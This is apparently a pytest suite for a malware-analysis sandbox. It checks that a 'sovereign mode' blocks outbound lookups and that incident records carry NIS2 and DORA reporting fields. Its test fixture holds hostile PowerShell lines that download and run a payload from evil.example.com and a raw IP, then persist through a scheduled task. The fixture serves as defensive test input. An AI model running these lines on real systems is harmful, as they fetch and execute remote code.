"""Sovereignty is enforced, and the incident record carries the regulator's fields.

Two claims are locked down here, and both are the kind that a buyer cannot take
on trust.

1. **"Your files never leave the building."** The test that matters is not that
   the switch exists but that a deployment which *is* configured to call out —
   a real VT key, a real Cuckoo URL — makes no socket call and says why. Every
   outbound helper here is given an httpx that fails the test if it is ever
   reached, so a regression that quietly restores the call cannot pass.

2. **The incident record.** NIS2 Article 23(4)(a) and DORA Article 18(1) fields
   are present for a malicious sample, the 24/72-hour deadlines are computed
   from awareness rather than invented, and a clean sample degrades to "not
   evidenced by this artifact" instead of either accusing or crashing. The
   record must also never claim to be a filing.
"""
from __future__ import annotations

import os
from contextlib import contextmanager

import httpx
import pytest

from app import sovereignty
from app.config import get_settings
from app.engine import incident as incident_mod
from app.engine import pipeline
from app.engine import report as report_mod
from app.engine.analyzers import intel
from app.engine.contracts import Sample
from app.engine.integrations import ENGINES, capability_report, opensource_clients
from app.engine.integrations import virustotal as vt_client
from app.engine.models import JobStatus, SandboxJob
from app.engine.storage import store_bytes

_MALICIOUS = (
    b"powershell -w hidden -EncodedCommand aQBlAHgA\n"
    b"IEX ((New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1'))\n"
    b"$c.DownloadFile('http://185.100.87.202/p.exe', 'C:\\Temp\\p.exe')\n"
    b"schtasks /create /tn Updater /tr C:\\Temp\\p.exe /sc onlogon\n"
)

_CLEAN = b"Release notes\nSee the manual for details.\nNothing to see here.\n"


@contextmanager
def _env(**overrides: str | None):
    """Set environment and rebuild the cached Settings around a block.

    ``get_settings`` is lru_cached, so a test that only sets the environment
    changes nothing. Clearing on the way in AND on the way out matters: a leaked
    cache entry would silently reconfigure every later test in the process.
    """
    previous = {k: os.environ.get(k) for k in overrides}
    try:
        for key, value in overrides.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        get_settings.cache_clear()
        yield
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value
        get_settings.cache_clear()


@pytest.fixture(autouse=True)
def _clean_refusal_tally():
    sovereignty.reset()
    yield
    sovereignty.reset()


def _no_network(monkeypatch):
    """Make every httpx entry point a test failure if it is reached."""

    def boom(*_a, **_k):  # noqa: ANN002, ANN003
        raise AssertionError("an outbound call was made under sovereign mode")

    for name in ("get", "post", "request", "stream"):
        monkeypatch.setattr(httpx, name, boom)
    monkeypatch.setattr(httpx.Client, "send", boom)


def _sample() -> Sample:
    return Sample(
        path="/quarantine/not-read-by-this-analyzer",
        size_bytes=1024,
        sha256="a" * 64,
        md5="b" * 32,
        mime="application/x-dosexec",
        magic="PE32 executable",
        claimed_extension=".exe",
        original_name="payload.exe",
    )


def _run(db, payload: bytes, name: str) -> SandboxJob:
    job = pipeline.new_job(db, store_bytes(payload), original_name=name, tenant="default")
    db.commit()
    pipeline.run(db, job)
    db.commit()
    assert job.status == JobStatus.COMPLETED
    return job


# ===========================================================================
# 1 — sovereign mode refuses, loudly, at the choke point
# ===========================================================================


def test_vt_configured_deployment_makes_no_call_and_reports_the_refusal(monkeypatch):
    """The load-bearing test: a real VT key, and still nothing leaves."""
    _no_network(monkeypatch)
    with _env(SOVEREIGN_MODE="true", VT_API_KEY="a-real-looking-key"):
        result = intel.analyze(_sample())

    assert result.ran is False
    assert "sovereign mode" in result.unavailable_reason.lower()
    assert "virustotal" in result.unavailable_reason.lower()
    # Never "lookup failed" — an operator must not be sent to debug their key.
    assert "lookup failed" not in result.unavailable_reason.lower()

    tally = sovereignty.refusals()
    assert tally["total"] == 1
    assert tally["by_destination"] == {"virustotal": 1}
    # The list of WHAT was refused is opt-in: an entry's `detail` is the thing
    # itself — a submitted URL, a sample's SHA-256 — and the counts are served
    # unauthenticated on /api/capabilities.
    assert "recent" not in tally
    detailed = sovereignty.refusals(include_detail=True)
    assert detailed["recent"][0]["destination"] == "virustotal"


def test_an_unconfigured_integration_does_not_pollute_the_refusal_tally(monkeypatch):
    """The count is evidence, and evidence has to mean something.

    Counting a refusal on a deployment that never had a VirusTotal key would log
    one per sample analysed and turn the number an auditor is shown into noise.
    """
    _no_network(monkeypatch)
    with _env(SOVEREIGN_MODE="true", VT_API_KEY=None):
        result = intel.analyze(_sample())

    assert result.ran is False
    assert "VT_API_KEY not set" in result.unavailable_reason
    assert sovereignty.refusals()["total"] == 0


def test_the_refusal_is_recorded_even_when_the_client_is_called_directly(monkeypatch):
    """The choke point is not something a caller can walk around."""
    _no_network(monkeypatch)
    with _env(SOVEREIGN_MODE="true"):
        verdict = vt_client.lookup("c" * 64, "a-real-looking-key")

    assert verdict == {
        "found": False,
        "error": "sovereign_mode_refused",
        "refusal": verdict["refusal"],
    }
    assert sovereignty.refusals()["total"] == 1


def test_cluster_clients_refuse_before_uploading_the_file(monkeypatch):
    """These send the customer's actual bytes, so they matter most."""
    _no_network(monkeypatch)
    with _env(SOVEREIGN_MODE="true"):
        outcomes = [
            opensource_clients.cuckoo_submit("https://cuckoo.example", "tok", b"MZ", "s.exe"),
            opensource_clients.capev2_submit("https://cape.example", "tok", b"MZ", "s.exe"),
            opensource_clients.strelka_scan("https://strelka.example", b"MZ", "s.exe"),
        ]

    for outcome in outcomes:
        assert outcome["ok"] is False
        assert outcome["error"] == "sovereign_mode_refused"
        assert "No analysis data left this deployment" in outcome["refusal"]

    assert sovereignty.refusals()["by_destination"] == {
        "cuckoo": 1,
        "capev2": 1,
        "strelka": 1,
    }


def test_an_undeclared_destination_fails_closed():
    """A future enrichment that forgets to register is blocked, not leaked."""
    with _env(SOVEREIGN_MODE="true"):
        with pytest.raises(sovereignty.OutboundRefused) as raised:
            sovereignty.check("some-new-threat-feed")
    assert raised.value.destination == "some-new-threat-feed"
    assert "undeclared destination" in raised.value.reason


def test_switching_sovereign_mode_off_restores_the_call(monkeypatch):
    """The switch has to be a switch. A block that cannot be lifted would be a
    bug masquerading as a guarantee, and would make the ON case untestable."""
    calls: list[str] = []

    class _Resp:
        status_code = 404

    def fake_get(url, **_k):  # noqa: ANN001, ANN003
        calls.append(url)
        return _Resp()

    monkeypatch.setattr(httpx, "get", fake_get)
    with _env(SOVEREIGN_MODE="false"):
        verdict = vt_client.lookup("d" * 64, "a-real-looking-key")

    assert calls and calls[0].endswith("d" * 64)
    assert verdict == {"found": False}
    assert sovereignty.refusals()["total"] == 0


# ===========================================================================
# 2 — the URL fetcher is the deliberate, separately-controllable exception
# ===========================================================================


def test_url_submission_is_permitted_by_default_but_closable(client, auth, monkeypatch):
    fetched: list[str] = []

    def fake_fetch(url, **_k):  # noqa: ANN001, ANN003
        fetched.append(url)
        raise AssertionError("reached the fetcher")  # far enough to prove the gate opened

    monkeypatch.setattr("app.api.sandbox.fetch", fake_fetch)

    with _env(SOVEREIGN_MODE="true", SOVEREIGN_ALLOW_URL_FETCH="true"):
        with pytest.raises(AssertionError, match="reached the fetcher"):
            client.post("/api/analyze/url", json={"url": "https://example.com/a.exe"}, headers=auth)
    assert fetched == ["https://example.com/a.exe"]

    with _env(SOVEREIGN_MODE="true", SOVEREIGN_ALLOW_URL_FETCH="false"):
        response = client.post(
            "/api/analyze/url", json={"url": "https://example.com/b.exe"}, headers=auth
        )
    assert response.status_code == 403
    assert "sovereign mode" in response.json()["detail"].lower()
    # The fetcher was never entered the second time.
    assert fetched == ["https://example.com/a.exe"]
    assert sovereignty.refusals()["by_destination"] == {"url_fetch": 1}


# ===========================================================================
# 3 — capabilities states the posture, and the proof
# ===========================================================================


def test_capabilities_reports_sovereign_mode_and_the_refusal_count(client):
    with _env(SOVEREIGN_MODE="true", SOVEREIGN_ALLOW_URL_FETCH="true"):
        sovereignty.record("virustotal", reason="test refusal")
        body = client.get("/api/capabilities").json()["sovereignty"]

    assert body["enabled"] is True
    assert body["url_fetch_allowed"] is True
    assert "Sovereign mode: ON" in body["statement"]
    # Both facts, not one: the URL exception must be stated where the claim is.
    assert "URL fetcher" in body["statement"]
    assert body["outbound_refusals"]["total"] == 1

    keys = {d["key"]: d for d in body["destinations"]}
    assert keys["virustotal"]["allowed"] is False
    assert keys["url_fetch"]["allowed"] is True
    assert keys["url_fetch"]["is_deliberate_exception"] is True
    assert keys["llm"]["allowed"] is False


def test_capabilities_states_the_off_posture_honestly(client):
    with _env(SOVEREIGN_MODE="false"):
        body = client.get("/api/capabilities").json()["sovereignty"]
    assert body["enabled"] is False
    assert "Sovereign mode: OFF" in body["statement"]
    assert all(d["allowed"] for d in body["destinations"])


def test_ai_provider_never_advertises_an_llm_it_may_not_call():
    """Or one it CANNOT call, which turned out to be every deployment.

    This asserted that sovereign mode suppresses the claim, and it did. What it
    could not see is that there is no LLM path in the codebase at all —
    `api.anthropic.com`, `import anthropic` and `messages.create` have zero hits
    across backend/, worker/ and frontend/ — so with the switch off, the one
    screen an operator reads to learn what leaves the building named a third
    party this product never contacts, and the UI labelled a template's prose as
    a model's (`ui.tsx: const live = source === 'anthropic'`).
    """
    for mode in ("true", "false"):
        with _env(SOVEREIGN_MODE=mode, ANTHROPIC_API_KEY="sk-ant-not-a-real-key"):
            assert get_settings().ai_provider == "template"


def test_no_llm_call_exists_to_advertise():
    """The reason for the test above. If someone implements the narrative, this
    fails and both tests get revisited together — which is the point."""
    import pathlib
    import re

    root = pathlib.Path(__file__).resolve().parents[2]
    # Code, not prose. `config.py` explains this very absence and quotes both
    # forms; a backtick means the line is documentation, and documentation
    # naming a thing is not the thing.
    pattern = re.compile(r"api\.anthropic\.com|^\s*(import|from)\s+anthropic\b")
    hits = [
        f"{path.relative_to(root)}:{n}"
        for folder in ("backend/app", "worker")
        for path in (root / folder).rglob("*.py")
        for n, line in enumerate(
            path.read_text(encoding="utf-8", errors="replace").splitlines(), 1
        )
        if "`" not in line and pattern.search(line)
    ]
    assert not hits, f"an LLM call exists now: {hits} — revisit ai_provider"


def test_integration_matrix_separates_configured_from_reachable():
    """A credentialed row on a sovereign deployment must show both facts, or a
    reader takes a green tick as proof the lookup happened."""
    with _env(SOVEREIGN_MODE="true", VT_API_KEY="a-real-looking-key"):
        rows = {r["key"]: r for r in capability_report()}

    assert rows["virustotal"]["configured"] is True
    assert rows["virustotal"]["sends_data_off_host"] is True
    assert rows["virustotal"]["blocked_by_sovereign_mode"] is True
    # Worker-resident engines never leave the building, so sovereign mode is
    # not a constraint on them and must not be reported as one.
    assert rows["native"]["sends_data_off_host"] is False
    assert rows["native"]["blocked_by_sovereign_mode"] is False


def test_every_off_host_engine_declares_a_known_destination():
    """The matrix and the choke point must not be able to drift apart."""
    for engine in ENGINES:
        if engine.destination:
            assert engine.destination in sovereignty.DESTINATIONS, engine.key


# ===========================================================================
# 4 — the incident record
# ===========================================================================


def test_incident_record_carries_the_nis2_early_warning_fields(db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    record = incident_mod.build(job)

    assert record["schema"] == incident_mod.SCHEMA
    assert record["record_status"] == "draft evidence record — not a regulatory filing"
    assert record["case_reference"] == job.public_id
    assert record["artifact"]["sha256"] == job.sha256

    nis2 = record["nis2"]
    assert nis2["regulation"] == "Directive (EU) 2022/2555 (NIS2)"
    assert "Article 23(4)(a)" in nis2["record_type"]

    # Article 23(4)(a): suspected of being caused by unlawful or malicious acts.
    act = nis2["suspected_unlawful_or_malicious_act"]
    assert act["answer"] in ("yes", "suspected")
    assert act["basis"]

    # Article 23(4)(a) / 23(6): cross-border impact. The tool supplies the input
    # and declines the conclusion.
    cross = nis2["cross_border_impact"]
    assert cross["answer"] == "undetermined"
    assert cross["artifact_reaches_outside_the_entity"] is True
    assert cross["operator_input_required"]

    # Article 23(4)(b): severity and impact indication.
    severity = nis2["severity_and_impact"]
    assert severity["engine_risk_level"] in ("low", "medium", "high", "critical")
    assert severity["artifact_impact_rating"]["vector"]
    assert severity["operational_impact_on_entity"] is None

    # Entity identification, and the timestamps the clock runs on.
    assert set(nis2["entity"]) >= {"name", "country", "sector", "contact"}
    assert nis2["timestamps"]["awareness_at"]
    assert nis2["timestamps"]["artifact_submitted_at"]


def test_nis2_deadlines_are_computed_from_awareness_not_invented(db):
    from datetime import datetime

    job = _run(db, _MALICIOUS, "invoice.ps1")
    stages = {s["stage"]: s for s in incident_mod.build(job)["nis2"]["reporting_stages"]}

    awareness = datetime.fromisoformat(
        incident_mod.build(job)["nis2"]["timestamps"]["awareness_at"]
    )
    early = datetime.fromisoformat(stages["early_warning"]["due_by"])
    notification = datetime.fromisoformat(stages["incident_notification"]["due_by"])

    assert (early - awareness).total_seconds() == pytest.approx(24 * 3600)
    assert (notification - awareness).total_seconds() == pytest.approx(72 * 3600)
    assert "Article 23(4)(a)" in stages["early_warning"]["article"]
    assert "Article 23(4)(b)" in stages["incident_notification"]["article"]
    # The one-month final report runs from the notification, which the entity
    # files — so a date here would be a guess printed in a regulatory record.
    assert stages["final_report"]["due_by"] is None


def test_incident_record_carries_the_dora_template(db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    dora = incident_mod.build(job)["dora"]

    assert dora["regulation"] == "Regulation (EU) 2022/2554 (DORA)"
    assert "Article 18(1)" in dora["classification"]["article"]

    # All seven Article 18(1) criteria are named, present or declined.
    assert set(dora["classification"]["criteria"]) == {
        "clients_financial_counterparts_affected",
        "reputational_impact",
        "duration_and_service_downtime",
        "geographical_spread",
        "data_losses",
        "criticality_of_services_affected",
        "economic_impact",
    }
    losses = dora["classification"]["criteria"]["data_losses"]
    assert set(losses) >= {"confidentiality", "integrity", "availability", "authenticity"}
    # The five the tool cannot observe are empty AND named as such.
    assert dora["classification"]["criteria"]["economic_impact"] is None
    assert "economic_impact" in dora["classification"]["operator_input_required"]

    kinds = {i["kind"] for i in dora["root_cause_indicators"]}
    assert "threat_classification" in kinds
    assert "delivery_vector" in kinds

    assert dora["temporal"]["detection_at"]
    assert dora["temporal"]["incident_occurrence_at"] is None
    # Article 20 RTS, not the Level 1 text — so no deadline is manufactured.
    assert all(s["due_by"] is None for s in dora["reporting_stages"])


def test_incident_record_degrades_sanely_for_a_clean_sample(db):
    job = _run(db, _CLEAN, "release-notes.txt")
    record = incident_mod.build(job)

    assert record["assessment"]["assessed_malicious"] is False
    act = record["nis2"]["suspected_unlawful_or_malicious_act"]
    assert act["answer"] == "not evidenced by this artifact"
    # It answers about the artifact, not about the incident — the distinction is
    # the difference between evidence and an all-clear the tool cannot give.
    assert "not about the incident" in act["basis"]

    assert record["nis2"]["cross_border_impact"]["answer"] == "undetermined"
    assert record["dora"]["classification"]["criteria"]["economic_impact"] is None
    assert record["evidence"]["limitations"]


def test_incident_record_never_claims_to_be_a_filing_or_to_advise(db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    record = incident_mod.build(job)

    assert "not a regulatory filing" in record["disclaimer"]
    assert "not legal advice" in record["disclaimer"]
    # The two determinations that are the entity's alone.
    assert record["nis2"]["significance_determination"]["decision"] == "operator"
    assert record["dora"]["major_incident_determination"]["decision"] == "operator"


def test_incident_record_survives_an_analysis_that_never_completed(db):
    """A compliance function that only gets a document on the good days has no
    document on the day it needs one."""
    job = pipeline.new_job(db, store_bytes(_MALICIOUS), original_name="stuck.ps1", tenant="default")
    db.commit()
    record = incident_mod.build(job)

    assert record["generated_by"]["analysis_complete"] is False
    assert "must not be filed as they stand" in record["generated_by"]["note"]
    assert record["nis2"]["timestamps"]["awareness_at"] is None
    assert all(s["due_by"] is None for s in record["nis2"]["reporting_stages"])


def test_incident_record_states_where_the_evidence_was_produced(db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    with _env(SOVEREIGN_MODE="true"):
        record = incident_mod.build(job)
    assert record["sovereignty"]["enabled"] is True
    assert "Sovereign mode: ON" in record["sovereignty"]["statement"]
    assert record["sovereignty"]["outbound_refusals_total"] == 0


# ===========================================================================
# 5 — the record reaches the exports
# ===========================================================================


def test_export_incident_route_serves_the_record(client, auth, db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    response = client.get(f"/api/jobs/{job.public_id}/export.incident", headers=auth)
    assert response.status_code == 200, response.text
    body = response.json()
    assert body["schema"] == incident_mod.SCHEMA
    assert body["nis2"]["suspected_unlawful_or_malicious_act"]["answer"] in ("yes", "suspected")


def test_export_incident_requires_authentication(client, db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    assert client.get(f"/api/jobs/{job.public_id}/export.incident").status_code in (401, 403)


def test_pdf_carries_the_regulatory_annex(db):
    from tests.test_report_assessment_exports import _pdf_text

    job = _run(db, _MALICIOUS, "invoice.ps1")
    text = _pdf_text(report_mod.as_pdf(job))

    assert "Regulatory annex" in text
    assert "Article 23(4)(a)" in text
    assert "Article 18(1)" in text
    assert "not a regulatory filing" in text
    # The annex must not silently drop the entity gap on a deployment that
    # never configured one.
    assert "NOT CONFIGURED" in text or "Operator input required" in text


def test_configured_entity_reaches_the_record(db):
    job = _run(db, _MALICIOUS, "invoice.ps1")
    with _env(
        ENTITY_NAME="Example Hospital Trust",
        ENTITY_COUNTRY="AZ",
        ENTITY_SECTOR="health",
        ENTITY_CONTACT="soc@example.invalid",
    ):
        entity = incident_mod.build(job)["nis2"]["entity"]
    assert entity["name"] == "Example Hospital Trust"
    assert entity["operator_input_required"] == []
